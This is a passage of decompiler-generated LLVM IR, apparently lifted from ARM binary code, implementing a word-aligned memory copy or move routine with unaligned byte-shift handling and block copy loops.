  %v1_18e34 = phi i32 [ %v4_18e34, %dec_label_pc_18e28 ], [ %v12_18e10, %dec_label_pc_18e1c ], [ %v0_18e7c76, %dec_label_pc_18ddc ]
  %v0_18e28 = load i32, i32* %lr.global-to-local, align 4
  %v3_18e28 = udiv i32 %v0_18e28, 65536
  store i32 %v3_18e28, i32* %ip.global-to-local, align 4
  %v0_18e2c = load i32, i32* %r1.global-to-local, align 4
  %v1_18e2c = inttoptr i32 %v0_18e2c to i32*
  %v2_18e2c = load i32, i32* %v1_18e2c, align 4
  store i32 %v2_18e2c, i32* %lr.global-to-local, align 4
  %v4_18e2c = add i32 %v0_18e2c, 4
  store i32 %v4_18e2c, i32* %r1.global-to-local, align 4
  %v4_18e30 = mul i32 %v2_18e2c, 65536
  %v5_18e30 = or i32 %v4_18e30, %v3_18e28
  store i32 %v5_18e30, i32* @ip, align 4
  %v2_18e34 = inttoptr i32 %v1_18e34 to i32*
  store i32 %v5_18e30, i32* %v2_18e34, align 4
  %v3_18e34 = load i32, i32* @r0, align 4
  %v4_18e34 = add i32 %v3_18e34, 4
  store i32 %v4_18e34, i32* @r0, align 4
  %v0_18e38 = load i32, i32* %r2.global-to-local, align 4
  %v1_18e38 = add i32 %v0_18e38, -4
  store i32 %v1_18e38, i32* %r2.global-to-local, align 4
  %v3_18e38 = sub i32 3, %v0_18e38
  %v4_18e38 = and i32 %v3_18e38, %v0_18e38
  %v5_18e38 = icmp slt i32 %v4_18e38, 0
  %v6_18e38 = icmp slt i32 %v1_18e38, 0
  %v2_18e3c = xor i1 %v6_18e38, %v5_18e38
  br i1 %v2_18e3c, label %dec_label_pc_18e40.loopexit, label %dec_label_pc_18e28

dec_label_pc_18e40.loopexit:                      ; preds = %dec_label_pc_18e28
  %v7_18e38 = icmp eq i32 %v0_18e38, 4
  store i1 %v5_18e38, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_18e38, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_18e38, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18e40

dec_label_pc_18e40:                               ; preds = %dec_label_pc_18e40.loopexit, %dec_label_pc_18e1c
  %v0_18cfc60 = phi i32 [ %v1_18e38, %dec_label_pc_18e40.loopexit ], [ %v1_18e20, %dec_label_pc_18e1c ]
  %v0_18e40 = load i32, i32* %r1.global-to-local, align 4
  %v1_18e40 = add i32 %v0_18e40, -2
  store i32 %v1_18e40, i32* @r1, align 4
  br label %bb140

dec_label_pc_18e48:                               ; preds = %dec_label_pc_18d5c
  br i1 %v2_18de0, label %dec_label_pc_18e94, label %dec_label_pc_18e50

dec_label_pc_18e50:                               ; preds = %dec_label_pc_18e48
  store i32 %v1_18ddc, i32* %r2.global-to-local, align 4
  %v3_18e54 = load i32, i32* @r4, align 4
  store i32 %v3_18e54, i32* %stack_var_-16, align 4
  %v6_18e54 = load i32, i32* @r5, align 4
  store i32 %v6_18e54, i32* %stack_var_-12, align 4
  br label %dec_label_pc_18e58

dec_label_pc_18e58:                               ; preds = %dec_label_pc_18e58.dec_label_pc_18e58_crit_edge, %dec_label_pc_18e50
  %v0_18e7c = phi i32 [ %v12_18e7c, %dec_label_pc_18e58.dec_label_pc_18e58_crit_edge ], [ %v0_18e7c76, %dec_label_pc_18e50 ]
  %v0_18e5c = phi i32 [ %v0_18e5c.pre, %dec_label_pc_18e58.dec_label_pc_18e58_crit_edge ], [ %v4_18d60, %dec_label_pc_18e50 ]
  %v0_18e58 = phi i32 [ %v0_18e58.pre, %dec_label_pc_18e58.dec_label_pc_18e58_crit_edge ], [ %v2_18d60, %dec_label_pc_18e50 ]
  %v3_18e58 = udiv i32 %v0_18e58, 16777216
  %v1_18e5c = inttoptr i32 %v0_18e5c to i32*
  %v2_18e5c = load i32, i32* %v1_18e5c, align 4
  store i32 %v2_18e5c, i32* %r4.global-to-local, align 4
  %v3_18e5c = add i32 %v0_18e5c, 4
  %v4_18e5c = inttoptr i32 %v3_18e5c to i32*
  %v5_18e5c = load i32, i32* %v4_18e5c, align 4
  store i32 %v5_18e5c, i32* %r5.global-to-local, align 4
  %v6_18e5c = add i32 %v0_18e5c, 8
  %v7_18e5c = inttoptr i32 %v6_18e5c to i32*
  %v8_18e5c = load i32, i32* %v7_18e5c, align 4
  store i32 %v8_18e5c, i32* %ip.global-to-local, align 4
  %v9_18e5c = add i32 %v0_18e5c, 12
  %v10_18e5c = inttoptr i32 %v9_18e5c to i32*
  %v11_18e5c = load i32, i32* %v10_18e5c, align 4
  store i32 %v11_18e5c, i32* %lr.global-to-local, align 4
  %v12_18e5c = add i32 %v0_18e5c, 16
  store i32 %v12_18e5c, i32* %r1.global-to-local, align 4
  %v4_18e60 = mul i32 %v2_18e5c, 256
  %v5_18e60 = or i32 %v4_18e60, %v3_18e58
  store i32 %v5_18e60, i32* @r3, align 4
  %v3_18e64 = udiv i32 %v2_18e5c, 16777216
  %v4_18e68 = mul i32 %v5_18e5c, 256
  %v5_18e68 = or i32 %v4_18e68, %v3_18e64
  store i32 %v5_18e68, i32* %r4.global-to-local, align 4
  %v3_18e6c = udiv i32 %v5_18e5c, 16777216
  %v4_18e70 = mul i32 %v8_18e5c, 256
  %v5_18e70 = or i32 %v4_18e70, %v3_18e6c
  store i32 %v5_18e70, i32* %r5.global-to-local, align 4
  %v3_18e74 = udiv i32 %v8_18e5c, 16777216
  %v4_18e78 = mul i32 %v11_18e5c, 256
  %v5_18e78 = or i32 %v4_18e78, %v3_18e74
  store i32 %v5_18e78, i32* @ip, align 4
  %v1_18e7c = inttoptr i32 %v0_18e7c to i32*
  store i32 %v5_18e60, i32* %v1_18e7c, align 4
  %v3_18e7c = add i32 %v0_18e7c, 4
  %v4_18e7c = inttoptr i32 %v3_18e7c to i32*
  %v5_18e7c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18e7c, i32* %v4_18e7c, align 4
  %v6_18e7c = add i32 %v0_18e7c, 8
  %v7_18e7c = inttoptr i32 %v6_18e7c to i32*
  %v8_18e7c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_18e7c, i32* %v7_18e7c, align 4
  %v9_18e7c = add i32 %v0_18e7c, 12
  %v10_18e7c = inttoptr i32 %v9_18e7c to i32*
  %v11_18e7c = load i32, i32* @ip, align 4
  store i32 %v11_18e7c, i32* %v10_18e7c, align 4
  %v12_18e7c = add i32 %v0_18e7c, 16
  store i32 %v12_18e7c, i32* @r0, align 4
  %v0_18e80 = load i32, i32* %r2.global-to-local, align 4
  %v1_18e80 = add i32 %v0_18e80, -16
  store i32 %v1_18e80, i32* %r2.global-to-local, align 4
  %v3_18e80 = sub i32 15, %v0_18e80
  %v4_18e80 = and i32 %v3_18e80, %v0_18e80
  %v5_18e80 = icmp slt i32 %v4_18e80, 0
  %v6_18e80 = icmp slt i32 %v1_18e80, 0
  %v2_18e84 = xor i1 %v6_18e80, %v5_18e80
  br i1 %v2_18e84, label %dec_label_pc_18e88, label %dec_label_pc_18e58.dec_label_pc_18e58_crit_edge

dec_label_pc_18e58.dec_label_pc_18e58_crit_edge:  ; preds = %dec_label_pc_18e58
  %v0_18e58.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_18e5c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18e58

dec_label_pc_18e88:                               ; preds = %dec_label_pc_18e58
  %v2_18e88 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18e88, i32* @r4, align 4
  %v5_18e88 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_18e88, i32* @r5, align 4
  %v1_18e8c = add i32 %v0_18e80, -4
  store i32 %v1_18e8c, i32* %r2.global-to-local, align 4
  %v3_18e8c = add i32 %v0_18e80, 2147483632
  %v4_18e8c = and i32 %v1_18e8c, %v3_18e8c
  %v5_18e8c = icmp slt i32 %v4_18e8c, 0
  store i1 %v5_18e8c, i1* %cpsr_v.global-to-local, align 1
  %v6_18e8c = icmp slt i32 %v1_18e8c, 0
  store i1 %v6_18e8c, i1* %cpsr_n.global-to-local, align 1
  %v7_18e8c = icmp eq i32 %v1_18e8c, 0
  store i1 %v7_18e8c, i1* %cpsr_z.global-to-local, align 1
  %v2_18e90 = xor i1 %v6_18e8c, %v5_18e8c
  br i1 %v2_18e90, label %dec_label_pc_18eac, label %dec_label_pc_18e94

dec_label_pc_18e94:                               ; preds = %dec_label_pc_18e88, %dec_label_pc_18e48, %dec_label_pc_18e94
  %v1_18ea0 = phi i32 [ %v4_18ea0, %dec_label_pc_18e94 ], [ %v12_18e7c, %dec_label_pc_18e88 ], [ %v0_18e7c76, %dec_label_pc_18e48 ]
  %v0_18e94 = load i32, i32* %lr.global-to-local, align 4
  %v3_18e94 = udiv i32 %v0_18e94, 16777216
  store i32 %v3_18e94, i32* %ip.global-to-local, align 4
  %v0_18e98 = load i32, i32* %r1.global-to-local, align 4
  %v1_18e98 = inttoptr i32 %v0_18e98 to i32*
  %v2_18e98 = load i32, i32* %v1_18e98, align 4
  store i32 %v2_18e98, i32* %lr.global-to-local, align 4
  %v4_18e98 = add i32 %v0_18e98, 4
  store i32 %v4_18e98, i32* %r1.global-to-local, align 4
  %v4_18e9c = mul i32 %v2_18e98, 256
  %v5_18e9c = or i32 %v4_18e9c, %v3_18e94
  store i32 %v5_18e9c, i32* @ip, align 4
  %v2_18ea0 = inttoptr i32 %v1_18ea0 to i32*
  store i32 %v5_18e9c, i32* %v2_18ea0, align 4
  %v3_18ea0 = load i32, i32* @r0, align 4
  %v4_18ea0 = add i32 %v3_18ea0, 4
  store i32 %v4_18ea0, i32* @r0, align 4
  %v0_18ea4 = load i32, i32* %r2.global-to-local, align 4
  %v1_18ea4 = add i32 %v0_18ea4, -4
  store i32 %v1_18ea4, i32* %r2.global-to-local, align 4
  %v3_18ea4 = sub i32 3, %v0_18ea4
  %v4_18ea4 = and i32 %v3_18ea4, %v0_18ea4
  %v5_18ea4 = icmp slt i32 %v4_18ea4, 0
  %v6_18ea4 = icmp slt i32 %v1_18ea4, 0
  %v2_18ea8 = xor i1 %v6_18ea4, %v5_18ea4
  br i1 %v2_18ea8, label %dec_label_pc_18eac.loopexit, label %dec_label_pc_18e94

dec_label_pc_18eac.loopexit:                      ; preds = %dec_label_pc_18e94
  %v7_18ea4 = icmp eq i32 %v0_18ea4, 4
  store i1 %v5_18ea4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_18ea4, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_18ea4, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18eac

dec_label_pc_18eac:                               ; preds = %dec_label_pc_18eac.loopexit, %dec_label_pc_18e88
  %v0_18cfc61 = phi i32 [ %v1_18ea4, %dec_label_pc_18eac.loopexit ], [ %v1_18e8c, %dec_label_pc_18e88 ]
  %v0_18eac = load i32, i32* %r1.global-to-local, align 4
  %v1_18eac = add i32 %v0_18eac, -1
  store i32 %v1_18eac, i32* @r1, align 4
  br label %bb140

dec_label_pc_18eb4:                               ; preds = %entry
  %v1_18eb4 = load i32, i32* @r2, align 4
  %v2_18eb4 = add i32 %v1_18eb4, %v0_18c60
  store i32 %v2_18eb4, i32* %r1.global-to-local, align 4
  %v2_18eb8 = add i32 %v1_18eb4, %v1_18c60
  store i32 %v2_18eb8, i32* %r0.global-to-local, align 4
  %v2_18ebc = add i32 %v1_18eb4, -4
  store i32 %v2_18ebc, i32* %r2.global-to-local, align 4
  %v4_18ebc = sub i32 3, %v1_18eb4
  %v5_18ebc = and i32 %v4_18ebc, %v1_18eb4
  %v6_18ebc = icmp slt i32 %v5_18ebc, 0
  store i1 %v6_18ebc, i1* %cpsr_v.global-to-local, align 1
  %v7_18ebc = icmp slt i32 %v2_18ebc, 0
  store i1 %v7_18ebc, i1* %cpsr_n.global-to-local, align 1
  %v8_18ebc = icmp eq i32 %v1_18eb4, 4
  store i1 %v8_18ebc, i1* %cpsr_z.global-to-local, align 1
  %v5_18ec0 = icmp slt i32 %v1_18eb4, 4
  br i1 %v5_18ec0, label %bb150, label %dec_label_pc_18ec4

dec_label_pc_18ec4:                               ; preds = %dec_label_pc_18eb4
  %v1_18ec4 = urem i32 %v2_18eb8, 4
  store i32 %v1_18ec4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18ec4 = icmp eq i32 %v1_18ec4, 0
  store i1 %v2_18ec4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18ec4, label %dec_label_pc_18ecc, label %dec_label_pc_18f6c

dec_label_pc_18ecc:                               ; preds = %dec_label_pc_18ec4
  %v1_18ecc = urem i32 %v2_18eb4, 4
  store i32 %v1_18ecc, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18ecc = icmp eq i32 %v1_18ecc, 0
  store i1 %v2_18ecc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18ecc, label %dec_label_pc_18ed4, label %dec_label_pc_18f98

dec_label_pc_18ed4:                               ; preds = %dec_label_pc_18ecc, %dec_label_pc_18f90
  %v0_18eec37 = phi i32 [ %v2_18eb8, %dec_label_pc_18ecc ], [ %v0_18fe020, %dec_label_pc_18f90 ]
  %v0_18ee836 = phi i32 [ %v2_18eb4, %dec_label_pc_18ecc ], [ %v0_18f90, %dec_label_pc_18f90 ]
  %v0_18ed4 = phi i32 [ %v2_18ebc, %dec_label_pc_18ecc ], [ %v2_18f88, %dec_label_pc_18f90 ]
  %v2_18ed4 = add i32 %v0_18ed4, -8
  store i32 %v2_18ed4, i32* %r2.global-to-local, align 4
  %v4_18ed4 = sub i32 7, %v0_18ed4
  %v5_18ed4 = and i32 %v4_18ed4, %v0_18ed4
  %v6_18ed4 = icmp slt i32 %v5_18ed4, 0
  store i1 %v6_18ed4, i1* %cpsr_v.global-to-local, align 1
  %v7_18ed4 = icmp slt i32 %v2_18ed4, 0
  store i1 %v7_18ed4, i1* %cpsr_n.global-to-local, align 1
  %v8_18ed4 = icmp eq i32 %v0_18ed4, 8
  store i1 %v8_18ed4, i1* %cpsr_z.global-to-local, align 1
  %v5_18ed8 = icmp slt i32 %v0_18ed4, 8
  br i1 %v5_18ed8, label %dec_label_pc_18f24, label %dec_label_pc_18edc

dec_label_pc_18edc:                               ; preds = %dec_label_pc_18ed4
  %v3_18edc = load i32, i32* @r4, align 4
  %v5_18edc = inttoptr i32 %v3_18edc to i8*
  store i8* %v5_18edc, i8** %stack_var_-8, align 4
  %v8_18edc = load i32, i32* @lr, align 4
  %v2_18ee0 = add i32 %v0_18ed4, -28
  store i32 %v2_18ee0, i32* %r2.global-to-local, align 4
  %v4_18ee0 = sub i32 27, %v0_18ed4
  %v5_18ee0 = and i32 %v4_18ee0, %v2_18ed4
  %v6_18ee0 = icmp slt i32 %v5_18ee0, 0
  store i1 %v6_18ee0, i1* %cpsr_v.global-to-local, align 1
  %v7_18ee0 = icmp slt i32 %v2_18ee0, 0
  store i1 %v7_18ee0, i1* %cpsr_n.global-to-local, align 1
  %v8_18ee0 = icmp eq i32 %v2_18ed4, 20
  store i1 %v8_18ee0, i1* %cpsr_z.global-to-local, align 1
  %v5_18ee4 = icmp slt i32 %v2_18ed4, 20
  br i1 %v5_18ee4, label %dec_label_pc_18f00, label %dec_label_pc_18ee8

dec_label_pc_18ee8:                               ; preds = %dec_label_pc_18edc, %dec_label_pc_18ee8.dec_label_pc_18ee8_crit_edge
  %v0_18eec = phi i32 [ %v1_18ef4, %dec_label_pc_18ee8.dec_label_pc_18ee8_crit_edge ], [ %v0_18eec37, %dec_label_pc_18edc ]
  %v0_18ee8 = phi i32 [ %v0_18ee8.pre, %dec_label_pc_18ee8.dec_label_pc_18ee8_crit_edge ], [ %v0_18ee836, %dec_label_pc_18edc ]
  %v1_18ee8 = add i32 %v0_18ee8, -4
  %v2_18ee8 = inttoptr i32 %v1_18ee8 to i32*
  %v3_18ee8 = load i32, i32* %v2_18ee8, align 4
  %v4_18ee8 = add i32 %v0_18ee8, -8
  %v5_18ee8 = inttoptr i32 %v4_18ee8 to i32*
  %v6_18ee8 = load i32, i32* %v5_18ee8, align 4
  store i32 %v6_18ee8, i32* %r4.global-to-local, align 4
  %v7_18ee8 = add i32 %v0_18ee8, -12
  %v8_18ee8 = inttoptr i32 %v7_18ee8 to i32*
  %v9_18ee8 = load i32, i32* %v8_18ee8, align 4
  store i32 %v9_18ee8, i32* %ip.global-to-local, align 4
  %v10_18ee8 = add i32 %v0_18ee8, -16
  %v11_18ee8 = inttoptr i32 %v10_18ee8 to i32*
  %v12_18ee8 = load i32, i32* %v11_18ee8, align 4
  store i32 %v12_18ee8, i32* %lr.global-to-local, align 4
  store i32 %v10_18ee8, i32* %r1.global-to-local, align 4
  %v1_18eec = add i32 %v0_18eec, -16
  %v2_18eec = inttoptr i32 %v1_18eec to i32*
  store i32 %v3_18ee8, i32* %v2_18eec, align 4
  %v4_18eec = add i32 %v0_18eec, -12
  %v5_18eec = inttoptr i32 %v4_18eec to i32*
  %v6_18eec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_18eec, i32* %v5_18eec, align 4
  %v7_18eec = add i32 %v0_18eec, -8
  %v8_18eec = inttoptr i32 %v7_18eec to i32*
  %v9_18eec = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_18eec, i32* %v8_18eec, align 4
  %v10_18eec = add i32 %v0_18eec, -4
  %v11_18eec = inttoptr i32 %v10_18eec to i32*
  %v12_18eec = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_18eec, i32* %v11_18eec, align 4
  store i32 %v1_18eec, i32* %r0.global-to-local, align 4
  %v0_18ef0 = load i32, i32* %r1.global-to-local, align 4
  %v1_18ef0 = add i32 %v0_18ef0, -4
  %v2_18ef0 = inttoptr i32 %v1_18ef0 to i32*
  %v3_18ef0 = load i32, i32* %v2_18ef0, align 4
  store i32 %v3_18ef0, i32* @r3, align 4
  %v4_18ef0 = add i32 %v0_18ef0, -8
  %v5_18ef0 = inttoptr i32 %v4_18ef0 to i32*
  %v6_18ef0 = load i32, i32* %v5_18ef0, align 4
  store i32 %v6_18ef0, i32* %r4.global-to-local, align 4
  %v7_18ef0 = add i32 %v0_18ef0, -12
  %v8_18ef0 = inttoptr i32 %v7_18ef0 to i32*
  %v9_18ef0 = load i32, i32* %v8_18ef0, align 4
  store i32 %v9_18ef0, i32* @ip, align 4
  %v10_18ef0 = add i32 %v0_18ef0, -16
  %v11_18ef0 = inttoptr i32 %v10_18ef0 to i32*
  %v12_18ef0 = load i32, i32* %v11_18ef0, align 4
  store i32 %v12_18ef0, i32* %lr.global-to-local, align 4
  store i32 %v10_18ef0, i32* %r1.global-to-local, align 4
  %v1_18ef4 = add i32 %v0_18eec, -32
  %v2_18ef4 = inttoptr i32 %v1_18ef4 to i32*
  store i32 %v3_18ef0, i32* %v2_18ef4, align 4
  %v4_18ef4 = add i32 %v0_18eec, -28
  %v5_18ef4 = inttoptr i32 %v4_18ef4 to i32*
  %v6_18ef4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_18ef4, i32* %v5_18ef4, align 4
  %v7_18ef4 = add i32 %v0_18eec, -24
  %v8_18ef4 = inttoptr i32 %v7_18ef4 to i32*
  %v9_18ef4 = load i32, i32* @ip, align 4
  store i32 %v9_18ef4, i32* %v8_18ef4, align 4
  %v10_18ef4 = add i32 %v0_18eec, -20
  %v11_18ef4 = inttoptr i32 %v10_18ef4 to i32*
  %v12_18ef4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_18ef4, i32* %v11_18ef4, align 4
  store i32 %v1_18ef4, i32* %r0.global-to-local, align 4
  %v0_18ef8 = load i32, i32* %r2.global-to-local, align 4
  %v2_18ef8 = add i32 %v0_18ef8, -32
  store i32 %v2_18ef8, i32* %r2.global-to-local, align 4
  %v6_18efc = icmp slt i32 %v0_18ef8, 32
  br i1 %v6_18efc, label %dec_label_pc_18f00.loopexit, label %dec_label_pc_18ee8.dec_label_pc_18ee8_crit_edge

dec_label_pc_18ee8.dec_label_pc_18ee8_crit_edge:  ; preds = %dec_label_pc_18ee8
  %v0_18ee8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18ee8

dec_label_pc_18f00.loopexit:                      ; preds = %dec_label_pc_18ee8
  %v4_18ef8 = sub i32 31, %v0_18ef8
  %v5_18ef8 = and i32 %v4_18ef8, %v0_18ef8
  %v6_18ef8 = icmp slt i32 %v5_18ef8, 0
  %v7_18ef8 = icmp slt i32 %v2_18ef8, 0
  store i1 %v6_18ef8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18ef8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18f00

dec_label_pc_18f00:                               ; preds = %dec_label_pc_18f00.loopexit, %dec_label_pc_18edc
  %v6_18f08 = phi i32 [ %v1_18ef4, %dec_label_pc_18f00.loopexit ], [ %v0_18eec37, %dec_label_pc_18edc ]
  %v0_18f10.pr = phi i32 [ %v2_18ef8, %dec_label_pc_18f00.loopexit ], [ %v2_18ee0, %dec_label_pc_18edc ]
  %v4_18f00 = add i32 %v0_18f10.pr, 16
  %v6_18f00 = sub i32 0, %v0_18f10.pr
  %v7_18f00 = and i32 %v4_18f00, %v6_18f00
  %v8_18f00 = icmp slt i32 %v7_18f00, 0
  store i1 %v8_18f00, i1* %cpsr_v.global-to-local, align 1
  %v9_18f00 = icmp slt i32 %v4_18f00, 0
  store i1 %v9_18f00, i1* %cpsr_n.global-to-local, align 1
  %v10_18f00 = icmp eq i32 %v4_18f00, 0
  store i1 %v10_18f00, i1* %cpsr_z.global-to-local, align 1
  %v5_18f04 = icmp slt i32 %v0_18f10.pr, -16
  br i1 %v5_18f04, label %.thread2, label %bb147

bb147:                                            ; preds = %dec_label_pc_18f00
  %v6_18f04 = load i32, i32* %r1.global-to-local, align 4
  %v7_18f04 = add i32 %v6_18f04, -4
  %v8_18f04 = inttoptr i32 %v7_18f04 to i32*
  %v9_18f04 = load i32, i32* %v8_18f04, align 4
  store i32 %v9_18f04, i32* @r3, align 4
  %v10_18f04 = add i32 %v6_18f04, -8
  %v11_18f04 = inttoptr i32 %v10_18f04 to i32*
  %v12_18f04 = load i32, i32* %v11_18f04, align 4
  store i32 %v12_18f04, i32* %r4.global-to-local, align 4
  %v13_18f04 = add i32 %v6_18f04, -12
  %v14_18f04 = inttoptr i32 %v13_18f04 to i32*
  %v15_18f04 = load i32, i32* %v14_18f04, align 4
  store i32 %v15_18f04, i32* @ip, align 4
  %v16_18f04 = add i32 %v6_18f04, -16
  %v17_18f04 = inttoptr i32 %v16_18f04 to i32*
  %v18_18f04 = load i32, i32* %v17_18f04, align 4
  store i32 %v18_18f04, i32* %lr.global-to-local, align 4
  store i32 %v16_18f04, i32* %r1.global-to-local, align 4
  %v7_18f08 = add i32 %v6_18f08, -16
  %v8_18f08 = inttoptr i32 %v7_18f08 to i32*
  store i32 %v9_18f04, i32* %v8_18f08, align 4
  %v10_18f08 = add i32 %v6_18f08, -12
  %v11_18f08 = inttoptr i32 %v10_18f08 to i32*
  %v12_18f08 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_18f08, i32* %v11_18f08, align 4
  %v13_18f08 = add i32 %v6_18f08, -8
  %v14_18f08 = inttoptr i32 %v13_18f08 to i32*
  %v15_18f08 = load i32, i32* @ip, align 4
  store i32 %v15_18f08, i32* %v14_18f08, align 4
  %v16_18f08 = add i32 %v6_18f08, -4
  %v17_18f08 = inttoptr i32 %v16_18f08 to i32*
  %v18_18f08 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_18f08, i32* %v17_18f08, align 4
  store i32 %v7_18f08, i32* %r0.global-to-local, align 4
  %v6_18f0c = load i32, i32* %r2.global-to-local, align 4
  %v7_18f0c = add i32 %v6_18f0c, -16
  store i32 %v7_18f0c, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_18f00, %bb147
  %v6_18f18 = phi i32 [ %v7_18f08, %bb147 ], [ %v6_18f08, %dec_label_pc_18f00 ]
  %v0_18f10 = phi i32 [ %v7_18f0c, %bb147 ], [ %v0_18f10.pr, %dec_label_pc_18f00 ]
  %v4_18f10 = add i32 %v0_18f10, 20
  store i32 %v4_18f10, i32* %r2.global-to-local, align 4
  %v6_18f10 = sub i32 0, %v0_18f10
  %v7_18f10 = and i32 %v4_18f10, %v6_18f10
  %v8_18f10 = icmp slt i32 %v7_18f10, 0
  store i1 %v8_18f10, i1* %cpsr_v.global-to-local, align 1
  %v9_18f10 = icmp slt i32 %v4_18f10, 0
  store i1 %v9_18f10, i1* %cpsr_n.global-to-local, align 1
  %v10_18f10 = icmp eq i32 %v4_18f10, 0
  store i1 %v10_18f10, i1* %cpsr_z.global-to-local, align 1
  %v5_18f14 = icmp slt i32 %v0_18f10, -20
  br i1 %v5_18f14, label %.thread4, label %bb148

bb148:                                            ; preds = %.thread2
  %v6_18f14 = load i32, i32* %r1.global-to-local, align 4
  %v7_18f14 = add i32 %v6_18f14, -4
  %v8_18f14 = inttoptr i32 %v7_18f14 to i32*
  %v9_18f14 = load i32, i32* %v8_18f14, align 4
  store i32 %v9_18f14, i32* @r3, align 4
  %v10_18f14 = add i32 %v6_18f14, -8
  %v11_18f14 = inttoptr i32 %v10_18f14 to i32*
  %v12_18f14 = load i32, i32* %v11_18f14, align 4
  store i32 %v12_18f14, i32* @ip, align 4
  %v13_18f14 = add i32 %v6_18f14, -12
  %v14_18f14 = inttoptr i32 %v13_18f14 to i32*
  %v15_18f14 = load i32, i32* %v14_18f14, align 4
  store i32 %v15_18f14, i32* %lr.global-to-local, align 4
  store i32 %v13_18f14, i32* %r1.global-to-local, align 4
  %v7_18f18 = add i32 %v6_18f18, -12
  %v8_18f18 = inttoptr i32 %v7_18f18 to i32*
  store i32 %v9_18f14, i32* %v8_18f18, align 4
  %v10_18f18 = add i32 %v6_18f18, -8
  %v11_18f18 = inttoptr i32 %v10_18f18 to i32*
  %v12_18f18 = load i32, i32* @ip, align 4
  store i32 %v12_18f18, i32* %v11_18f18, align 4
  %v13_18f18 = add i32 %v6_18f18, -4
  %v14_18f18 = inttoptr i32 %v13_18f18 to i32*
  %v15_18f18 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_18f18, i32* %v14_18f18, align 4
  store i32 %v7_18f18, i32* %r0.global-to-local, align 4
  %v6_18f1c = load i32, i32* %r2.global-to-local, align 4
  %v7_18f1c = add i32 %v6_18f1c, -12
  store i32 %v7_18f1c, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb148
  %v6_18f3c45 = phi i32 [ %v6_18f18, %.thread2 ], [ %v7_18f18, %bb148 ]
  %v0_18f2443 = phi i32 [ %v4_18f10, %.thread2 ], [ %v7_18f1c, %bb148 ]
  %v2_18f20 = load i8*, i8** %stack_var_-8, align 4
  %v3_18f20 = ptrtoint i8* %v2_18f20 to i32
  store i32 %v3_18f20, i32* @r4, align 4
  store i32 %v8_18edc, i32* @lr, align 4
  br label %dec_label_pc_18f24

dec_label_pc_18f24:                               ; preds = %dec_label_pc_18ed4, %.thread4
  %v7_18f34 = phi i32 [ %v0_18eec37, %dec_label_pc_18ed4 ], [ %v6_18f3c45, %.thread4 ]
  %v0_18f24 = phi i32 [ %v2_18ed4, %dec_label_pc_18ed4 ], [ %v0_18f2443, %.thread4 ]
  %v2_18f24 = add i32 %v0_18f24, 8
  store i32 %v2_18f24, i32* %r2.global-to-local, align 4
  %v4_18f24 = sub i32 0, %v0_18f24
  %v5_18f24 = and i32 %v2_18f24, %v4_18f24
  %v6_18f24 = icmp slt i32 %v5_18f24, 0
  store i1 %v6_18f24, i1* %cpsr_v.global-to-local, align 1
  %v7_18f24 = icmp slt i32 %v2_18f24, 0
  store i1 %v7_18f24, i1* %cpsr_n.global-to-local, align 1
  %v8_18f24 = icmp eq i32 %v2_18f24, 0
  store i1 %v8_18f24, i1* %cpsr_z.global-to-local, align 1
  %v5_18f28 = icmp slt i32 %v0_18f24, -8
  br i1 %v5_18f28, label %bb150, label %dec_label_pc_18f2c

dec_label_pc_18f2c:                               ; preds = %dec_label_pc_18f24
  %v6_18f2c = add i32 %v0_18f24, 4
  store i32 %v6_18f2c, i32* %r2.global-to-local, align 4
  %v8_18f2c = sub i32 -5, %v0_18f24
  %v9_18f2c = and i32 %v8_18f2c, %v2_18f24
  %v10_18f2c = icmp slt i32 %v9_18f2c, 0
  store i1 %v10_18f2c, i1* %cpsr_v.global-to-local, align 1
  %v11_18f2c = icmp slt i32 %v6_18f2c, 0
  store i1 %v11_18f2c, i1* %cpsr_n.global-to-local, align 1
  %v12_18f2c = icmp eq i32 %v2_18f24, 4
  store i1 %v12_18f2c, i1* %cpsr_z.global-to-local, align 1
  %v5_18f30 = icmp slt i32 %v2_18f24, 4
  %v6_18f30 = load i32, i32* %r1.global-to-local, align 4
  %v7_18f30 = add i32 %v6_18f30, -4
  %v8_18f30 = inttoptr i32 %v7_18f30 to i32*
  %v9_18f30 = load i32, i32* %v8_18f30, align 4
  store i32 %v9_18f30, i32* @r3, align 4
  br i1 %v5_18f30, label %.thread8, label %bb149

.thread8:                                         ; preds = %dec_label_pc_18f2c
  store i32 %v7_18f30, i32* %r1.global-to-local, align 4
  %v8_18f34 = add i32 %v7_18f34, -4
  %v9_18f34 = inttoptr i32 %v8_18f34 to i32*
  store i32 %v9_18f30, i32* %v9_18f34, align 4
  %v10_18f34 = load i32, i32* %r0.global-to-local, align 4
  %v11_18f34 = add i32 %v10_18f34, -4
  store i32 %v11_18f34, i32* %r0.global-to-local, align 4
  %v0_18f44.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150
